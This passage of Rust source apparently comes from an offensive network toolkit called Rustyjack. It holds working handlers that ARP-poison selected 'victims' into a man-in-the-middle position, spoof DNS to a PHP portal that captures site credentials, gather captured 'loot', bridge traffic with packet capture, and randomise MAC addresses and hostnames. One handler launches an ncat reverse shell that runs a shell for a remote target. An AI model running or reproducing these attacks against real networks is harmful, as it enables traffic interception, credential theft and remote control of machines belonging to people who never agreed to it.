        .iter()
        .map(|d| HostInfo { ip: d.ip })
        .collect();
    if victims.is_empty() {
        bail!("No victims selected for poisoning");
    }

    let loot_label = format!("{}-{}", site, cidr.replace('/', "_"));
    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
    let pcap_display = pcap_path.to_string_lossy().to_string();
    let dns_capture_dir = pcap_path
        .parent()
        .map(|p| p.join("dnsspoof").join(&site))
        .unwrap_or_else(|| {
            root.join("loot")
                .join("Ethernet")
                .join("dnsspoof")
                .join(&site)
        });
    fs::create_dir_all(&dns_capture_dir).ok();

    // Clean slate
    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");
    let _ = kill_process_pattern("php -S 0.0.0.0:80");
    let _ = kill_process_pattern("php");
    let _ = kill_process_pattern("ettercap");

    enable_ip_forwarding(true)?;

    let gateway = interface_gateway(&interface_info.name)?
        .or_else(|| default_gateway_ip().ok())
        .ok_or_else(|| anyhow!("could not determine gateway for {}", interface_info.name))?;

    for host in &victims {
        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
    }

    start_tcpdump_capture(&interface_info.name, &pcap_path)?;

    // Start DNS spoof + portal
    rewrite_ettercap_dns(interface_info.address)?;
    start_php_server(&site_dir, Some(&dns_capture_dir))?;
    start_ettercap(&interface_info.name)?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_site_cred",
        Some(&sanitize_label(&loot_label)),
    );

    let victim_ips: Vec<String> = human_devices.iter().map(|d| d.ip.to_string()).collect();
    let _ = write_scoped_log(
        root,
        "Ethernet",
        &cidr,
        "SiteCredCapture",
        "sitecred",
        &[
            format!("Site credential capture on {}", cidr),
            format!("Site: {}", site),
            format!("Interface: {}", interface_info.name),
            format!("Victims: {}", victim_ips.len()),
            format!("PCAP: {}", pcap_path.display()),
            format!("DNS capture dir: {}", dns_capture_dir.display()),
        ],
    );
    let data = json!({
        "interface": interface_info.name,
        "network": cidr,
        "site": site,
        "victim_count": victim_ips.len(),
        "victims": victim_ips,
        "victims_skipped": skipped,
        "gateway": gateway.to_string(),
        "pcap_path": pcap_display,
        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
        "dns_capture_dir": dns_capture_dir.to_string_lossy(),
        "max_hosts": cap,
        "dns_spoof": true,
    });

    Ok(("Site cred capture running".to_string(), data))
}

fn handle_mitm_stop() -> Result<HandlerResult> {
    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");
    enable_ip_forwarding(false)?;

    let data = json!({ "stopped": true });
    Ok(("MITM stopped".to_string(), data))
}

fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<HandlerResult> {
    let DnsSpoofStartArgs {
        site,
        interface,
        loot_dir,
    } = args;
    let interface_info = detect_interface(interface)?;
    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
    if !site_dir.exists() {
        bail!("Site template not found: {}", site_dir.display());
    }

    let _ = kill_process_pattern("php -S 0.0.0.0:80");
    let _ = kill_process_pattern("ettercap");

    let capture_dir = if let Some(dir) = loot_dir {
        let base = dir.join(&site);
        fs::create_dir_all(&base).ok();
        base
    } else {
        let base = root.join("DNSSpoof").join("captures").join(&site);
        fs::create_dir_all(&base).ok();
        base
    };

    rewrite_ettercap_dns(interface_info.address)?;
    start_php_server(&site_dir, Some(&capture_dir))?;
    start_ettercap(&interface_info.name)?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_dnsspoof",
        Some(&sanitize_label(&site)),
    );

    let data = json!({
        "interface": interface_info.name,
        "site": site,
        "capture_dir": capture_dir,
    });
    Ok(("DNS spoofing started".to_string(), data))
}

fn handle_dnsspoof_stop() -> Result<HandlerResult> {
    let _ = kill_process_pattern("php -S 0.0.0.0:80");
    let _ = kill_process_pattern("php");
    let _ = kill_process_pattern("ettercap");
    let data = json!({ "stopped": true });
    Ok(("DNS spoofing stopped".to_string(), data))
}

fn handle_wifi_recon_gateway(args: WifiReconGatewayArgs) -> Result<HandlerResult> {
    log::info!("Discovering gateway information");

    let interface = match args.interface {
        Some(iface) => iface,
        None => select_wifi_interface(None)?,
    };

    enforce_single_interface(&interface)?;

    let gateway_info = discover_gateway(&interface)?;

    let data = json!({
        "interface": gateway_info.interface,
        "default_gateway": gateway_info.default_gateway,
        "dns_servers": gateway_info.dns_servers,
        "dhcp_server": gateway_info.dhcp_server,
        "isolation_enforced": true,
    });

    let mut msg = format!("Gateway info for {}:\n", interface);
    if let Some(gw) = gateway_info.default_gateway {
        msg.push_str(&format!("  Gateway: {}\n", gw));
    }
    if !gateway_info.dns_servers.is_empty() {
        msg.push_str(&format!("  DNS: {:?}\n", gateway_info.dns_servers));
    }
    if let Some(dhcp) = gateway_info.dhcp_server {
        msg.push_str(&format!("  DHCP: {}", dhcp));
    }

    Ok((msg, data))
}

fn handle_wifi_recon_arp_scan(args: WifiReconArpScanArgs) -> Result<HandlerResult> {
    log::info!("Scanning local network via ARP on {}", args.interface);

    enforce_single_interface(&args.interface)?;

    let devices = arp_scan(&args.interface)?;

    let devices_json: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "ip": d.ip.to_string(),
                "mac": d.mac,
                "hostname": d.hostname,
                "vendor": d.vendor,
            })
        })
        .collect();

    let data = json!({
        "interface": args.interface,
        "devices": devices_json,
        "count": devices.len(),
        "isolation_enforced": true,
    });

    let msg = format!("Found {} device(s) on {}", devices.len(), args.interface);

    Ok((msg, data))
}

fn handle_wifi_recon_service_scan(args: WifiReconServiceScanArgs) -> Result<HandlerResult> {
    log::info!("Scanning network services on {}", args.interface);

    let devices = arp_scan(&args.interface)?;
    let services = scan_network_services(&devices)?;

    let services_json: Vec<Value> = services
        .iter()
        .map(|s| {
            json!({
                "ip": s.ip.to_string(),
                "services": s.services.iter().map(|svc| {
                    json!({
                        "port": svc.port,
                        "service": svc.service,
                        "state": svc.state,
                    })
                }).collect::<Vec<_>>(),
            })
        })
        .collect();

    let data = json!({
        "interface": args.interface,
        "results": services_json,
        "count": services.len(),
    });

    let msg = format!("Found services on {} device(s)", services.len());

    Ok((msg, data))
}

fn handle_wifi_recon_mdns_scan(args: WifiReconMdnsScanArgs) -> Result<HandlerResult> {
    log::info!("Discovering mDNS devices for {} seconds", args.duration);

    let devices = discover_mdns_devices(args.duration)?;

    let devices_json: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "name": d.name,
                "ip": d.ip.to_string(),
                "services": d.services,
                "txt_records": d.txt_records,
            })
        })
        .collect();

    let data = json!({
        "devices": devices_json,
        "count": devices.len(),
        "duration": args.duration,
    });

    let msg = format!("Found {} mDNS device(s)", devices.len());

    Ok((msg, data))
}

fn handle_wifi_recon_bandwidth(args: WifiReconBandwidthArgs) -> Result<HandlerResult> {
    log::info!(
        "Monitoring bandwidth on {} for {} seconds",
        args.interface,
        args.duration
    );

    let before = get_traffic_stats(&args.interface)?;
    std::thread::sleep(Duration::from_secs(args.duration));
    let after = get_traffic_stats(&args.interface)?;

    let bandwidth = calculate_bandwidth(&before, &after);

    let rx_mbps = bandwidth.rx_bps / 1_000_000.0;
    let tx_mbps = bandwidth.tx_bps / 1_000_000.0;

    let data = json!({
        "interface": args.interface,
        "duration_secs": args.duration,
        "rx_mbps": rx_mbps,
        "tx_mbps": tx_mbps,
        "rx_bytes": after.rx_bytes.saturating_sub(before.rx_bytes),
        "tx_bytes": after.tx_bytes.saturating_sub(before.tx_bytes),
    });

    let msg = format!("Bandwidth: RX={:.2} Mbps, TX={:.2} Mbps", rx_mbps, tx_mbps);

    Ok((msg, data))
}

fn handle_wifi_recon_dns_capture(args: WifiReconDnsCaptureArgs) -> Result<HandlerResult> {
    use std::io::BufRead;

    log::info!(
        "Capturing DNS queries on {} for {} seconds",
        args.interface,
        args.duration
    );

    let mut child = start_dns_capture(&args.interface)?;
    let stdout = child.stdout.take().context("Failed to capture stdout")?;
    let reader = BufReader::new(stdout);

    let start = std::time::Instant::now();
    let mut queries = Vec::new();

    for line in reader.lines() {
        if start.elapsed().as_secs() >= args.duration {
            break;
        }

        if let Ok(line_str) = line {
            if let Some(query) = parse_dns_query(&line_str) {
                queries.push(json!({
                    "domain": query.domain,
                    "type": query.query_type,
                    "source": query.source_ip.to_string(),
                }));
            }
        }
    }

    let _ = child.kill();
    let _ = child.wait();

    let data = json!({
        "interface": args.interface,
        "duration_secs": args.duration,
        "queries": queries,
        "count": queries.len(),
    });

    let msg = format!("Captured {} DNS queries", queries.len());

    Ok((msg, data))
}

fn handle_loot_list(root: &Path, args: LootListArgs) -> Result<HandlerResult> {
    let dir = loot_directory(root, args.kind);
    let kind_label = loot_kind_label(args.kind);
    let mut entries = Vec::new();

    if dir.exists() {
        for entry in WalkDir::new(&dir).into_iter().filter_map(Result::ok) {
            if !entry.file_type().is_file() {
                continue;
            }
            let path = entry.into_path();
            let metadata = path.metadata()?;
            let modified = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH);
            let modified_ts = modified
                .duration_since(UNIX_EPOCH)
                .unwrap_or(Duration::ZERO)
                .as_secs();
            let file_name = path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());
            entries.push((
                modified,
                json!({
                    "name": file_name,
                    "path": path.to_string_lossy(),
                    "size": metadata.len(),
                    "modified": modified_ts,
                }),
            ));
        }
    }

    entries.sort_by(|a, b| b.0.cmp(&a.0));
    let files: Vec<Value> = entries.into_iter().map(|(_, value)| value).collect();

    let data = json!({
        "kind": kind_label,
        "directory": dir.to_string_lossy(),
        "files": files,
    });
    Ok(("Loot listing generated".to_string(), data))
}

fn handle_loot_read(root: &Path, args: LootReadArgs) -> Result<HandlerResult> {
    let LootReadArgs { path, max_lines } = args;
    let resolved = resolve_loot_path(root, &path)?;
    let contents =
        fs::read_to_string(&resolved).with_context(|| format!("reading {}", resolved.display()))?;
    let mut lines = Vec::new();
    let mut truncated = false;
    for (idx, line) in contents.lines().enumerate() {
        if idx >= max_lines {
            truncated = true;
            break;
        }
        lines.push(line.to_string());
    }

    let data = json!({
        "path": resolved.to_string_lossy(),
        "line_count": lines.len(),
        "truncated": truncated,
        "lines": lines,
    });

    Ok(("Loot file read".to_string(), data))
}

fn handle_process_kill(args: ProcessKillArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut killed = Vec::new();
    let mut not_found = Vec::new();

    for name in args.names {
        match kill_process(&name)? {
            KillResult::Terminated => killed.push(name),
            KillResult::NotFound => not_found.push(name),
        }
    }

    let message = if killed.is_empty() {
        "No matching processes were running".to_string()
    } else if not_found.is_empty() {
        "Processes terminated".to_string()
    } else {
        "Some processes terminated".to_string()
    };

    let data = json!({
        "killed": killed,
        "not_found": not_found,
    });

    Ok((message, data))
}

fn handle_process_status(args: ProcessStatusArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut running = Vec::new();
    let mut not_running = Vec::new();

    for name in args.names {
        let is_running = process_running_exact(&name)?;
        if is_running {
            running.push(name);
        } else {
            not_running.push(name);
        }
    }

    let message = if running.is_empty() {
        "No specified processes are running".to_string()
    } else if not_running.is_empty() {
        "All specified processes are running".to_string()
    } else {
        "Some specified processes are running".to_string()
    };

    let data = json!({
        "running": running,
        "not_running": not_running,
    });

    Ok((message, data))
}

fn handle_status_summary() -> Result<HandlerResult> {
    let scan_running = process_running_exact("nmap")?;
    let mitm_running = process_running_exact("tcpdump")? || process_running_exact("arpspoof")?;
    let dnsspoof_running = process_running_exact("ettercap")?;
    let responder_running = process_running_pattern("Responder.py")?;

    let status_text = compose_status_text(
        scan_running,
        mitm_running,
        dnsspoof_running,
        responder_running,
    );

    let data = json!({
        "scan_running": scan_running,
        "mitm_running": mitm_running,
        "dnsspoof_running": dnsspoof_running,
        "responder_running": responder_running,
        "status_text": status_text,
    });

    Ok(("Status collected".to_string(), data))
}

fn handle_network_status() -> Result<HandlerResult> {
    let interface_info = detect_interface(None).ok();

    let gateway_ip = default_gateway_ip().ok();
    let gateway_reachable = match gateway_ip {
        Some(ip) => ping_host(&ip.to_string(), Duration::from_secs(2)).unwrap_or(false),
        None => false,
    };
    let internet_reachable = ping_host("1.1.1.1", Duration::from_secs(2)).unwrap_or(false);

    let interface_stats = interface_info
        .as_ref()
        .and_then(|info| read_interface_stats(&info.name).ok());

    let dns_servers = read_dns_servers().unwrap_or_default();

    let mut data = serde_json::Map::new();
    if let Some(info) = interface_info.as_ref() {
        data.insert("interface".into(), Value::String(info.name.clone()));
        data.insert("address".into(), Value::String(info.address.to_string()));
        data.insert("cidr".into(), Value::String(info.network_cidr()));
    }
    if let Some(gw) = gateway_ip {
        data.insert("gateway".into(), Value::String(gw.to_string()));
    }
    data.insert("gateway_reachable".into(), Value::Bool(gateway_reachable));
    data.insert("internet_reachable".into(), Value::Bool(internet_reachable));
    if let Some(stats) = interface_stats {
        data.insert("rx_bytes".into(), Value::Number(stats.rx_bytes.into()));
        data.insert("tx_bytes".into(), Value::Number(stats.tx_bytes.into()));
        data.insert("oper_state".into(), Value::String(stats.oper_state.clone()));
    }
    data.insert(
        "dns_servers".into(),
        Value::Array(dns_servers.into_iter().map(Value::String).collect()),
    );

    Ok(("Network health collected".to_string(), Value::Object(data)))
}

fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<HandlerResult> {
    let ReverseLaunchArgs {
        target,
        port,
        shell,
        interface,
    } = args;

    let interface_info = detect_interface(interface)?;
    let mut cmd = std::process::Command::new("ncat");
    cmd.arg(&target)
        .arg(port.to_string())
        .arg("-e")
        .arg(&shell)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .arg("-s")
        .arg(interface_info.address.to_string());

    let child = cmd.spawn().context("launching ncat reverse shell")?;

    let log_entry = format!(
        "[{}] reverse-shell -> {}:{} via {} (pid {})",
        chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
        target,
        port,
        interface_info.name,
        child.id(),
    );
    let _ = append_payload_log(root, &log_entry);

    let data = json!({
        "target": target,
        "port": port,
        "interface": interface_info.name,
        "pid": child.id(),
        "shell": shell,
    });
    Ok(("Reverse shell launched".to_string(), data))
}

fn handle_wifi_list() -> Result<HandlerResult> {
    let mut interfaces = list_interface_summaries()?;
    interfaces.sort_by(|a, b| a.name.cmp(&b.name));
    let data = json!({ "interfaces": interfaces });
    Ok(("Interface list generated".to_string(), data))
}

fn handle_wifi_status(root: &Path, args: WifiStatusArgs) -> Result<HandlerResult> {
    log::info!("Collecting WiFi status information");

    let interface_name = args.interface.clone();
    let info = if let Some(name) = interface_name.clone() {
        log::info!("Getting status for specified interface: {name}");
        match detect_interface(Some(name.clone())) {
            Ok(i) => i,
            Err(e) => {
                log::error!("Failed to detect interface {name}: {e}");
                bail!("Failed to get interface info for {name}: {e}");
            }
        }
    } else {
        log::info!("Auto-detecting default interface");
        match detect_interface(None) {
            Ok(i) => {
                log::info!("Detected default interface: {}", i.name);
                i
            }
            Err(e) => {
                log::error!("Failed to detect default interface: {e}");
                bail!("Failed to detect default interface: {e}");
            }
        }
    };

    let stats = read_interface_stats(&info.name).ok();
    let gateway = if let Some(name) = interface_name.clone() {
        interface_gateway(&name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    } else {
        interface_gateway(&info.name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    };

    let preferred = read_interface_preference(root, "system_preferred")
        .ok()
        .flatten();

    let link = read_wifi_link_info(&info.name);

    // Determine if this is the active interface
    let default_route = read_default_route().ok().flatten();
    let is_active = default_route
        .as_ref()
        .and_then(|r| r.interface.as_ref())
        .map(|iface| iface == &info.name)
        .unwrap_or(false);

    log::info!(
        "Interface {} status: active={}, connected={}",
        info.name,
        is_active,
        link.connected
    );

    let data = json!({
        "interface": info.name,
        "address": info.address,
        "cidr": info.network_cidr(),
        "stats": stats,
        "gateway": gateway,
        "preferred": preferred,
        "connected": link.connected,
        "ssid": link.ssid,
        "signal_dbm": link.signal_dbm,
        "tx_bitrate": link.tx_bitrate,
        "is_active": is_active,
        "default_route_interface": default_route.and_then(|r| r.interface),
    });
    Ok(("Interface status collected".to_string(), data))
}

fn handle_wifi_best(root: &Path, args: WifiBestArgs) -> Result<HandlerResult> {
    let interface =
        select_best_interface(root, args.prefer_wifi)?.unwrap_or_else(|| "eth0".to_string());
    let data = json!({ "interface": interface });
    Ok(("Best interface selected".to_string(), data))
}

fn handle_wifi_switch(root: &Path, args: WifiSwitchArgs) -> Result<HandlerResult> {
    let interface = args.interface;
    write_interface_preference(root, "system_preferred", &interface)?;
    let data = json!({ "interface": interface });
    Ok(("Interface preference saved".to_string(), data))
}

fn ensure_route_health_check() -> Result<()> {
    // netlink availability
    if crate::netlink_helpers::netlink_list_interfaces().is_err() {
        bail!("netlink interface query failed (check kernel support and privileges)");
    }

    // root permissions
    let uid_out = Command::new("id").arg("-u").output();
    match uid_out {
        Ok(out) if out.status.success() => {
            let uid = String::from_utf8_lossy(&out.stdout)
                .trim()
                .parse::<u32>()
                .unwrap_or(u32::MAX);
            if uid != 0 {
                bail!("Rustyjack must run as root (uid 0) to manage interfaces and routes");
            }
        }
        _ => bail!("Unable to determine UID (need root to manage interfaces)"),
    }

    // rfkill availability - check /dev/rfkill exists
    #[cfg(target_os = "linux")]
    {
        if !std::path::Path::new("/dev/rfkill").exists() {
            bail!("/dev/rfkill not found (rfkill subsystem missing in kernel)");
        }
    }

    // /etc/resolv.conf must be writable by root
    let resolv = std::fs::OpenOptions::new()
        .write(true)
        .append(true)
        .open("/etc/resolv.conf");
    if let Err(e) = resolv {
        if e.kind() == std::io::ErrorKind::PermissionDenied {
            bail!(
                "/etc/resolv.conf is not writable (possible immutable bit or permissions). \
                 Remove chattr +i or adjust permissions before running ensure-route."
            );
        } else {
            bail!("Failed to open /etc/resolv.conf for write: {}", e);
        }
    }

    // /sys/class/net must be readable
    fs::read_dir("/sys/class/net").context("reading /sys/class/net")?;

    Ok(())
}

fn handle_wifi_route_status(_root: &Path) -> Result<HandlerResult> {
    let default_route = read_default_route().unwrap_or(None);
    let interfaces = list_interface_summaries()?;
    let dns_servers = read_dns_servers().unwrap_or_default();
    let data = json!({
        "default_route": default_route,
        "interfaces": interfaces,
        "dns_servers": dns_servers,
    });
    Ok(("Routing status collected".to_string(), data))
}

fn interface_has_carrier(interface: &str) -> bool {
    if interface.is_empty() {
        return false;
    }
    let carrier_path = format!("/sys/class/net/{}/carrier", interface);
    let oper_path = format!("/sys/class/net/{}/operstate", interface);
    let oper_state = fs::read_to_string(&oper_path)
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string();
    let oper_ready = matches!(oper_state.as_str(), "up" | "unknown");
    match fs::read_to_string(&carrier_path) {
        Ok(val) => val.trim() == "1" || oper_ready,
        Err(_) => oper_ready,
    }
}

fn try_dhcp_acquire(interface: &str) -> Result<Option<Ipv4Addr>> {
    #[cfg(target_os = "linux")]
    {
        let result = match tokio::runtime::Handle::try_current() {
            Ok(handle) => {
                handle.block_on(async { rustyjack_netlink::dhcp_acquire(interface, None).await })
            }
            Err(_) => {
                let rt = tokio::runtime::Runtime::new()
                    .map_err(|e| anyhow!("Failed to create tokio runtime: {}", e))?;
                rt.block_on(async { rustyjack_netlink::dhcp_acquire(interface, None).await })
            }
        };

        match result {
            Ok(lease) => {
                log::info!(
                    "[ROUTE] DHCP lease acquired on {}: {}/{} gateway={:?}",
                    interface,
                    lease.address,
                    lease.prefix_len,
                    lease.gateway
                );
                Ok(lease.gateway)
            }
            Err(e) => {
                log::warn!("[ROUTE] DHCP acquire failed on {}: {}", interface, e);
                Ok(None)
            }
        }
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = interface;
        Ok(None)
    }
}

fn handle_wifi_route_ensure(root: &Path, args: WifiRouteEnsureArgs) -> Result<HandlerResult> {
    use crate::system::enforce_single_interface;

    let WifiRouteEnsureArgs { interface } = args;
    ensure_route_health_check()?;

    let mut summaries = list_interface_summaries()?;
    let mut target_interface = interface.clone();
    let mut iface = summaries.iter().find(|s| s.name == interface);

    if iface.is_none() {
        if let Some((stored_iface, mac)) =
            read_interface_preference_with_mac(root, "system_preferred")?
        {
            if let Some(mac) = mac {
                if let Some(found) = find_interface_by_mac(&mac) {
                    target_interface = found;
                    summaries = list_interface_summaries()?;
                    iface = summaries.iter().find(|s| s.name == target_interface);
                    // Update preference to the renamed interface
                    write_interface_preference(root, "system_preferred", &target_interface)?;
                    log::info!(
                        "Recovered renamed interface: {} -> {}",
                        stored_iface,
                        target_interface
                    );
                }
            }
        }
    }

    let _iface = iface.ok_or_else(|| anyhow!("interface {} not found", interface))?;

    enforce_single_interface(&target_interface)?;
    let mut summaries = list_interface_summaries()?;
    let mut iface_summary = summaries
        .iter()
        .find(|s| s.name == target_interface)
        .cloned()
        .ok_or_else(|| anyhow!("interface {} not found", target_interface))?;

    let mut dhcp_gateway = None;
    if iface_summary.kind == "wired" && iface_summary.ip.is_none() {
        #[cfg(target_os = "linux")]
        let _ = netlink_set_interface_up(&target_interface);
        if !interface_has_carrier(&target_interface) {
            log::warn!(
                "[ROUTE] No carrier detected on {}; attempting DHCP anyway",
                target_interface
            );
        }
        dhcp_gateway = try_dhcp_acquire(&target_interface)?;
        if dhcp_gateway.is_some() {
            summaries = list_interface_summaries()?;
            if let Some(updated) = summaries
                .iter()
                .find(|s| s.name == target_interface)
                .cloned()
            {
                iface_summary = updated;
            }
        }
    }

    let gateway = interface_gateway(&target_interface)?.or(dhcp_gateway);
    let mut route_set = false;
    let mut gateway_ip = None;

    if let Some(gateway) = gateway {
        set_default_route(&target_interface, gateway)?;
        let _ = rewrite_dns_servers(&target_interface, gateway);
        route_set = true;
        gateway_ip = Some(gateway);
    } else {
        // Remove any existing default route so traffic cannot leak to other interfaces
        let _ = crate::netlink_helpers::netlink_delete_default_route();
    }

    write_interface_preference(root, "system_preferred", &target_interface)?;
    let ping_success = if route_set {
        ping_host("8.8.8.8", Duration::from_secs(2)).unwrap_or(false)
    } else {
        false
    };

    let data = json!({
        "interface": target_interface,
        "ip": iface_summary.ip,
        "gateway": gateway_ip,
        "route_set": route_set,
        "ping_success": ping_success,
        "isolation_enforced": true,
    });
    let msg = if route_set {
        "Default route updated"
    } else {
        "Interface isolated (no gateway found)"
    };
    Ok((msg.to_string(), data))
}

fn handle_wifi_route_backup(root: &Path) -> Result<HandlerResult> {
    let path = backup_routing_state(root)?;
    let data = json!({ "path": path });
    Ok(("Routing configuration backed up".to_string(), data))
}

fn handle_wifi_route_restore(root: &Path) -> Result<HandlerResult> {
    restore_routing_state(root)?;
    Ok(("Routing configuration restored".to_string(), json!({})))
}

fn handle_wifi_route_metric(args: WifiRouteMetricArgs) -> Result<HandlerResult> {
    set_interface_metric(&args.interface, args.metric)?;
    let data = json!({
        "interface": args.interface,
        "metric": args.metric,
    });
    Ok(("Interface metric updated".to_string(), data))
}

fn handle_system_update(root: &Path, args: SystemUpdateArgs) -> Result<HandlerResult> {
    run_system_update_with_progress(root, args, |_, _| {})
}

pub fn run_system_update_with_progress<F>(
    root: &Path,
    args: SystemUpdateArgs,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    on_progress(0.1, "Creating backup...");
    let backup = backup_repository(root, args.backup_dir.as_deref())?;

    on_progress(0.3, "Fetching updates...");
    git_reset_to_remote(root, &args.remote, &args.branch)?;

    on_progress(0.5, "Compiling binary...");
    // We assume cargo is available in the path
    let status = std::process::Command::new("cargo")
        .arg("build")
        .arg("--release")
        .current_dir(root)
        .status()
        .context("executing cargo build --release")?;

    if !status.success() {
        bail!("Compilation failed with status {}", status);
    }

    on_progress(0.9, "Restarting service...");
    restart_system_service(&args.service)?;

    let data = json!({
        "backup_path": backup,
        "service": args.service,
        "remote": args.remote,
        "branch": args.branch,
    });
    Ok((
        "Repository updated, compiled, and service restarted".to_string(),
        data,
    ))
}

fn handle_randomize_hostname() -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        bail!("Hostname randomization supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        let new_hostname = randomize_hostname()?;
        let data = json!({ "hostname": new_hostname });
        Ok((format!("Hostname set to {}", new_hostname), data))
    }
}

fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<HandlerResult> {
    let SystemFdePrepareArgs { device } = args;
    if !device.starts_with("/dev/") {
        bail!("Device must be a block path like /dev/sda");
    }

    let script = root.join("scripts").join("fde_prepare_usb.sh");
    if !script.exists() {
        bail!("FDE prep script missing at {}", script.display());
    }

    let output = Command::new("bash")
        .arg(&script)
        .arg(&device)
        .output()
        .with_context(|| format!("running {}", script.display()))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if !output.status.success() {
        let msg = if !stderr.trim().is_empty() {
            stderr.trim().to_string()
        } else {
            format!("fde prepare failed with status {:?}", output.status.code())
        };
        bail!(msg);
    }

    let data = json!({
        "device": device,
        "stdout": stdout,
        "stderr": stderr,
    });
    Ok(("FDE USB prepared".to_string(), data))
}

fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
    let SystemFdeMigrateArgs {
        target,
        keyfile,
        execute,
    } = args;

    if !target.starts_with("/dev/") {
        bail!("Target must be a block path like /dev/mmcblk0p3");
    }
    if keyfile.is_empty() {
        bail!("Keyfile path is required");
    }
    let script = root.join("scripts").join("fde_migrate_root.sh");
    if !script.exists() {
        bail!("FDE migrate script missing at {}", script.display());
    }

    let mut cmd = Command::new("bash");
    cmd.arg(&script)
        .arg("--target")
        .arg(&target)
        .arg("--keyfile")
        .arg(&keyfile);
    if execute {
        cmd.arg("--execute");
    }

    let output = cmd
        .output()
        .with_context(|| format!("running {}", script.display()))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if !output.status.success() {
        let msg = if !stderr.trim().is_empty() {
            stderr.trim().to_string()
        } else {
            format!("fde migrate failed with status {:?}", output.status.code())
        };
        bail!(msg);
    }

    let data = json!({
        "target": target,
        "keyfile": keyfile,
        "execute": execute,
        "stdout": stdout,
        "stderr": stderr,
    });
    Ok((
        if execute {
            "FDE migration completed".to_string()
        } else {
            "FDE migration dry-run completed".to_string()
        },
        data,
    ))
}

fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResult> {
    let backup = backup_routing_state(root)?;
    start_bridge_pair(&args.interface_a, &args.interface_b)?;
    let label = format!("bridge_{}_{}", args.interface_a, args.interface_b);
    let pcap_path = build_mitm_pcap_path(root, Some(&label))?;
    let _ = append_payload_log(
        root,
        &format!(
            "[{}] bridge start: {} <-> {} (pcap {})",
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
            args.interface_a,
            args.interface_b,
            pcap_path.to_string_lossy()
        ),
    );
    start_tcpdump_capture("br0", &pcap_path)?;
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "capture_path": pcap_path,
        "routing_backup": backup,
    });
    Ok(("Transparent bridge enabled".to_string(), data))
}

fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult> {
    let _ = kill_process("tcpdump");
    stop_bridge_pair(&args.interface_a, &args.interface_b)?;
    if let Err(err) = restore_routing_state(root) {
        log::warn!("bridge stop: failed to restore routing: {err}");
    }
    let _ = append_payload_log(
        root,
        &format!(
            "[{}] bridge stop: {} <-> {}",
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
            args.interface_a,
            args.interface_b,
        ),
    );
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "routing_restored": true,
    });
    Ok(("Transparent bridge disabled".to_string(), data))
}

fn handle_wifi_scan(root: &Path, args: WifiScanArgs) -> Result<HandlerResult> {
    log::info!("Starting WiFi scan");

    let interface = match args.interface {
        Some(iface) => iface,
        None => {
            // Try to get active interface from config first
            if let Ok(Some(active)) = get_active_interface(root) {
                log::info!("Using active interface from config: {}", active);
                active
            } else {
                // Fall back to auto-detection
                select_wifi_interface(None)?
            }
        }
    };
    let interface = select_wifi_interface(Some(interface.trim().to_string()))?;

    enforce_single_interface(&interface)?;
    try_apply_mac_policy(root, MacStage::PreAssoc, &interface, None);

    let networks = match scan_wifi_networks(&interface) {
        Ok(nets) => {
            log::info!("Scan completed, found {} network(s)", nets.len());
            nets
        }
        Err(e) => {
            log::error!("WiFi scan failed on {interface}: {e}");
            bail!("WiFi scan failed: {e}");
        }
    };

    let data = json!({
        "interface": interface,
        "networks": networks,
        "count": networks.len(),
        "isolation_enforced": true,
    });
    Ok(("Wi-Fi scan completed".to_string(), data))
}

fn try_apply_mac_policy(root: &Path, stage: MacStage, interface: &str, ssid: Option<&str>) {
    let config = load_mac_policy_config(root);
    if config.assoc_mode == MacMode::Off && config.preassoc_mode == MacMode::Off {
        return;
    }

    if stage == MacStage::Assoc {
        if let Some(ssid) = ssid {
            if let Some(mac) = per_network_mac_override(root, interface, ssid) {
                if let Ok(parsed) = MacAddress::parse(&mac) {
                    if let Ok(mut manager) = MacManager::new() {
                        manager.set_auto_restore(false);
                        if let Ok(current) = manager.get_mac(interface) {
                            if current != parsed {
                                if manager.set_mac(interface, &parsed).is_ok() {
                                    log::info!(
                                        "[MAC_POLICY] override {} {} -> {} (per-network)",
                                        interface,
                                        current,
                                        parsed
                                    );
                                }
                            }
                        }
                    }
                    return;
                }
            }
        }
    }

    match MacPolicyEngine::new(root, config) {
        Ok(mut engine) => {
